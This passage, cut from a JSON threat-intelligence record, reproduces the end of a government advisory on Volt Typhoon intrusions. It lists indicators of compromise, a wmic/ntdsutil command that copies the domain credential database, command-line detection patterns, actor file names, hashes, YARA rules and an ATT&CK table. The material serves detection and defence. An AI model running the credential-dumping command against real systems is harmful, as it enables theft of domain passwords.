C:\\Windows\\Temp\\Pro\"\n   wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm\n   \\\"create full C:\\Windows\\Temp\\\"\n\n#### Command line patterns\n```\nCertain patterns in commands (with asterisks for wildcards) can be used to identify\npotentially malicious commands:\n\n  - `cmd.exe /C dir /S \\\\* >> *`\n\n  - `cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1`\n\n  - `powershell start-process -filepath c:\\windows\\temp\\*.exe -`\n```\n   windowstyle hidden\n\n#### File paths\n```\nThe most common paths where files and executables used by the actor have been\nfound include:\n\n  - `C:\\Users\\Public\\Appfile (including subdirectories)`\n\n  - `C:\\Perflogs (including subdirectories)`\n\n  - `C:\\Windows\\Temp (including subdirectories)`\n\n#### File names\nThe file names the actor has previously used for such things as malware, scripts, and\ntools include:\n\nbackup.bat cl64.exe update.bat Win.exe\nbillagent.exe nc.exe update.exe WmiPrvSE.exe\nbillaudit.exe rar.exe vm3dservice.exe WmiPreSV.exe\ncisco_up.exe SMSvcService.exe watchdogd.exe\n\nIn addition to the file names and paths above, malicious files names, believed to be\nrandomly created, in the following format have also been discovered:\n```\nC:\\Windows\\[a-zA-Z]{8}.exe\n\n#### SHA-256 file hashes\n\n```\n  - `f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd`\n\n  - `ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31`\n\n  - `d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca`\n\n**TLP:CLEAR**\n\n|tools include:|Col2|Col3|Col4|\n|---|---|---|---|\n|backup.bat|cl64.exe|update.bat|Win.exe|\n|billagent.exe|nc.exe|update.exe|WmiPrvSE.exe|\n|billaudit.exe|rar.exe|vm3dservice.exe|WmiPreSV.exe|\n|cisco_up.exe|SMSvcService.exe|watchdogd.exe||\n\n\n-----\n\n**TLP:CLEAR**\n\n\n\n  - `472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d`\n\n  - `66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7`\n\n  - `3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71`\n\n  - `41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597`\n\n  - `c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99`\n\n  - `3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f`\n\n  - `fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15`\n\n  - `ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484`\n\n#### User-agent\nIn some cases, the following user-agent string (including the extra spacing) was\nidentified performing reconnaissance activities by this actor:\n```\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0) \nGecko/20100101 Firefox/68.0\n\n```\n**Note: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.**\n\n#### Yara rules\n```\n rule ShellJSP {\n   strings:\n     $s1 = \"decrypt(fpath)\"\n     $s2 = \"decrypt(fcontext)\"\n     $s3 = \"decrypt(commandEnc)\"\n     $s4 = \"upload failed!\"\n     $s5 = \"aes.encrypt(allStr)\"\n     $s6 = \"newid\"\n   condition:\n     filesize < 50KB and 4 of them\n }\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n```\nrule EncryptJSP {\n  strings:\n    $s1 = \"AEScrypt\"\n    $s2 = \"AES/CBC/PKCS5Padding\"\n    $s3 = \"SecretKeySpec\"\n    $s4 = \"FileOutputStream\"\n    $s5 = \"getParameter\"\n    $s6 = \"new ProcessBuilder\"\n    $s7 = \"new BufferedReader\"\n    $s8 = \"readLine()\"\n  condition:\n    filesize < 50KB and 6 of them\n}\nrule CustomFRPClient {\n  meta:\n    description=”Identify instances of the actor's custom FRP tool based\non unique strings chosen by the actor and included in the tool”\n  strings:\n    $s1 = \"%!PS-Adobe-\" nocase ascii wide\n    $s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide\n    $s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase\nascii wide\n    $s4 = \"MAGA2024!!!\" nocase ascii wide\n    $s5 = \"HTTP_PROXYHost: %s\" nocase ascii wide\n  condition:\n    all of them\n}\nrule HACKTOOL_FRPClient {\n  meta:\n    description=”Identify instances of FRP tool (Note: This tool is\nknown to be used by multiple actors, so hits would not necessarily imply\nactivity by the specific actor described in this report)”\n  strings:\n    $s1 = \"%!PS-Adobe-\" nocase ascii wide\n    $s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide\n    $s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase\nascii wide\n    $s4 = \"HTTP_PROXYHost: %s\" nocase ascii wide\n  condition:\n    3 of them\n}\n\n```\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n## References\n\nActive Directory and domain controller hardening:\n\n[ Best practices: https://learn.microsoft.com/en-us/windows-server/identity/ad-](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)\n\n[ds/plan/security-best-practices/best-practices-for-securing-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)\n\nCISA regional cyber threats:\n\n[ PRC state-sponsored activity: China Cyber Threat Overview and Advisories](https://www.cisa.gov/china)\n\nMicrosoft Threat Intelligence blog:\n\n  - [Volt Typhoon activity: https://www.microsoft.com/en-](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)\n[us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)\n[living-off-the-land-techniques/](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)\n\nNtdsutil.exe:\n\n  - [Overview: https://learn.microsoft.com/en-us/previous-versions/windows/it-](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11))\n[pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11))\n\nPowerShell:\n\n  - Best practices: [https://media.defense.gov/2022/Jun/22/2003021689/-1/-](https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF)\n[1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_](https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF)\n[EMBRACE_20220622.PDF](https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF)\n\n  - [Logging configuration: https://www.mandiant.com/resources/blog/greater-visibility](https://www.mandiant.com/resources/blog/greater-visibility)\n\nWindows command line process auditing:\n\n  - [Overview: https://learn.microsoft.com/en-us/windows-server/identity/ad-](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)\n[ds/manage/component-updates/command-line-process-auditing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)\n\nWindows Defender Firewall:\n\n  - Best practices: [https://learn.microsoft.com/en-us/windows/security/threat-](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/best-practices-configuring)\n[protection/windows-firewall/best-practices-configuring](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/best-practices-configuring)\n\n  - [Logging configuration: https://learn.microsoft.com/en-us/windows/security/threat-](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/configure-the-windows-firewall-log)\n[protection/windows-firewall/configure-the-windows-firewall-log](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/configure-the-windows-firewall-log)\n\nWindows management instrumentation:\n\n  - [Events: https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity#obtaining-wmi-events-through-event-viewer)\n[activity#obtaining-wmi-events-through-event-viewer](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity#obtaining-wmi-events-through-event-viewer)\n\n  - [Tracing activity: https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity)\n[wmi-activity](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity)\n\nWindows password spraying:\n\n  - [Logging and playbook configuration: https://learn.microsoft.com/en-](https://learn.microsoft.com/en-us/security/compass/incident-response-playbook-password-spray)\n[us/security/compass/incident-response-playbook-password-spray](https://learn.microsoft.com/en-us/security/compass/incident-response-playbook-password-spray)\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n## Acknowledgements\n\nThe NSA Cybersecurity Collaboration Center, along with the authoring agencies,\nacknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's\nThreat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence\n(MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry\npartners for their collaboration on this advisory.\n\n**_Disclaimer of endorsement_**\n\nThe information and opinions contained in this document are provided \"as is\" and without any warranties\nor guarantees. Reference herein to any specific commercial products, process, or service by trade name,\ntrademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or\nfavoring by the authoring agencies’ governments, and this guidance shall not be used for advertising or\nproduct endorsement purposes.\n\n**_Trademark recognition_**\n\nActive Directory[®], Microsoft[®], PowerShell[®], and Windows[®] are registered trademarks of Microsoft\nCorporation. MITRE[®] and ATT&CK[®] are registered trademarks of The MITRE Corporation.\n\n**_Purpose_**\n\nThis document was developed in furtherance of the authoring agencies’ cybersecurity missions, including\ntheir responsibilities to identify and disseminate threats, and to develop and issue cybersecurity\n\nspecifications and mitigations. This information may be shared broadly to reach all appropriate\n\nstakeholders.\n\n**_Contact_**\n\n**U.S. organizations: Urgently report any anomalous activity or incidents, including based upon technical**\n[information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or](mailto:Report@cisa.dhs.gov)\n[cisa.gov/report](https://www.cisa.gov/report) [or to the FBI via your local FBI field office listed at https://www.fbi.gov/contact-us/field-](https://www.fbi.gov/contact-us/field-offices)\n[offices.](https://www.fbi.gov/contact-us/field-offices)\n[NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov](mailto:CybersecurityReports@nsa.gov)\n[NSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov](mailto:DIB_Defense@cyber.nsa.gov)\n[NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov](mailto:MediaRelations@nsa.gov)\n\n**Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report**\ncybersecurity incidents and to access alerts and advisories.\n\n**[Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.](mailto:contact@cyber.gc.ca)**\n\n**[New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498](mailto:incidents@ncsc.govt.nz)**\n7654.\n\n**[United Kingdom organizations: Report a significant cyber security incident at ncsc.gov.uk/report-an-](https://ncsc.gov.uk/report-an-incident)**\n[incident](https://ncsc.gov.uk/report-an-incident) (monitored 24 hours) or, for urgent assistance, call 03000 200 973.\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n\n## Appendix: MITRE ATT&CK Techniques\n\nTable 2 captures all referenced threat actor tactics and techniques in this advisory.\n\n|Table 2: All referenced threat actor tactics and techniques|Col2|Col3|\n|---|---|---|\n|Initial Access|||\n|Technique Title|ID|Use|\n|Exploit Public-facing Application|T1190|Actor used public-facing applications to gain initial access to systems; in this case, Earthworm and PortProxy.|\n|Execution|||\n|Windows Management Instrumentation|T1047|The actor executed WMIC commands to create a copy of the SYSTEM registry.|\n|Command and Scripting Interpreter: PowerShell|T1059.001|The actor used a PowerShell command to identify successful logons to the host.|\n|Command and Scripting Interpreter: Windows Command Shell|T1059.003|The actor used this primary command prompt to execute a query that collected information about the storage devices on the local host.|\n|Persistence|||\n|Server Software Component: Web Shell|T1505.003|The actor used backdoor web servers with web shells to establish persistence to systems, including some of the webshells being derived from Awen webshell.|\n|Defense Evasion|||\n|Indicator Removal|T1070|The actor selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity.|\n|Indicator Removal: Clear Windows Event Logs|T1070.001|The actor cleared system event logs to hide activity of an intrusion.|\n|Credential Access|||\n|OS Credential Dumping: NTDS|T1003.003|The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive out of the network to perform password cracking.|\n|Brute Force|T1110|The actor attempted to gain access to accounts with multiple password attempts.|\n|Brute Force: Password Spraying|T1110.003|The actor used commonly used passwords against accounts to attempt to acquire valid credentials.|\n|OS Credential Dumping|T1003|The actor used additional commands to obtain credentials in the environment.|\n\n\n**TLP:CLEAR**\n\n\n-----\n\nThe actor used compromised SOHO\ndevices (e.g. routers) to obfuscate the\nsource of their activity.\n\n|Col1|Col2|TLP:CLEAR|\n|---|---|---|\n|Credentials from Password Stores|T1555|The actor searched for common password storage locations.|\n|Discovery|||\n|System Information Discovery|T1082|The actor executed commands to gather information about local drives.|\n|System Owner/User Discovery|T1033|The actor gathered information about successful logons to the host using a PowerShell command.|\n|Permission Groups Discovery: Local Groups|T1069.001|The actor attempt to find local system groups and permission settings.|\n|Permission Groups Discovery: Doman Groups|T1069.002|The actor used commands to enumerate the active directory structure.|\n|System Network Configuration Discovery|T1016|The actor used commands to enumerate the network topology.|\n|Command and Control|||\n|Proxy|T1090|The actor used commands to enable port forwarding on the host.|\n|Proxy: External Proxy|T1090.002|The actor used compromised SOHO devices (e.g. routers) to obfuscate the source of their activity.|\n\n\n**TLP:CLEAR**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF"
    ],
    "report_names": [
        "CSA_Living_off_the_Land.PDF"
    ],
    "threat_actors": [
        {
            "id": "846522d7-29cb-4a0c-8ebe-ffba7429e2d7",
            "created_at": "2023-06-23T02:04:34.793629Z",
            "updated_at": "2025-03-27T02:02:10.204744Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "Bronze Silhouette",
                "Dev-0391",
                "Insidious Taurus",
                "Redfly",
                "Storm-0391",
                "UNC3236",
                "VOLTZITE",
                "Vanguard Panda"
            ],
            "source_name": "ETDA:Volt Typhoon",
            "tools": [
                "FRP",
                "Fast Reverse Proxy",
                "Impacket",
                "LOLBAS",
                "LOLBins",
                "Living off the Land"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "382f2519-30b3-4943-b494-2d675bc2b38f",
            "created_at": "2024-06-19T02:03:07.951514Z",
            "updated_at": "2025-03-27T02:05:17.287489Z",
            "deleted_at": null,
            "main_name": "BRONZE SILHOUETTE",
            "aliases": [
                "Volt Typhoon "
            ],
            "source_name": "Secureworks:BRONZE SILHOUETTE",
            "tools": [
                " Web shells",
                "Living-off-the-land binaries"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4ed2b20c-7523-4852-833b-cebee8029f55",
            "created_at": "2023-05-26T02:02:03.524749Z",
            "updated_at": "2025-03-27T02:00:03.132087Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "VANGUARD PANDA",
                "UNC3236",
                "Insidious Taurus",
                "VOLTZITE",
                "Dev-0391",
                "Storm-0391",
                "BRONZE SILHOUETTE"
            ],
            "source_name": "MISPGALAXY:Volt Typhoon",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a88747e2-ffed-45d8-b847-8464361b2254",
            "created_at": "2023-11-01T02:01:06.605663Z",
            "updated_at": "2025-03-27T02:00:55.42808Z",
            "deleted_at": null,
            "main_name": "Volt Typhoon",
            "aliases": [
                "Volt Typhoon",
                "BRONZE SILHOUETTE",
                "Vanguard Panda",
                "DEV-0391",
                "UNC3236",
                "Voltzite",
                "Insidious Taurus"
            ],
            "source_name": "MITRE:Volt Typhoon",
            "tools": [
                "netsh",
                "PsExec",
                "ipconfig",
                "Wevtutil",
                "VersaMem",
                "Tasklist",
                "Mimikatz",
                "Impacket",
                "Systeminfo",
                "netstat",
                "Nltest",
                "certutil",
                "FRP",
                "cmd"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1695089230,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1685620570,
    "ts_modification_date": 1685620570,
    "files": {
        "pdf": "https://archive.orkl.eu/012ddc65bd916989f9731cecde0dad4ca881e95d.pdf",
        "text": "https://archive.orkl.eu/012ddc65bd916989f9731cecde0dad4ca881e95d.txt",
        "img": "https://archive.orkl.eu/012ddc65bd916989f9731cecde0dad4ca881e95d.jpg"
    }
}